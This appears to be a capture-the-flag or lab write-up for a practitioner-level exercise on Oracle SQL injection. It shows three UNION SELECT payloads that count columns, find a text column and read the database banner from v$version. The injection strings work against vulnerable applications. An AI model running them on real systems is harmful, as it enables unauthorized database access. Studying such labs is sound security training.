
### SQL injection attack, querying the database type and version on Oracle : PRACTITIONER

---

> Category parameter is vulnerable to sql injection. First thing to do is get the number of columns. This is an oracle database, so must add `FROM DUAL` at the end of the query. If the FROM part wasn't added, the payloads wouldnt work, confirming it as an oracle database.
```
' UNION SELECT NULL, NULL FROM DUAL--
```
> The query has 2 output columns.

> Find out the column data types, and we need text to display the banner of the database.
```
' UNION SELECT 'a', NULl FROM DUAL--
```
> The first column works, so just use it.

> Change the first column to display the banner of the oracle database as requested, and change the table to `v$version`.
```
' UNION SELECT BANNER, NULL FROM v$version--
```
> outputs the banner of the database as needed.

---
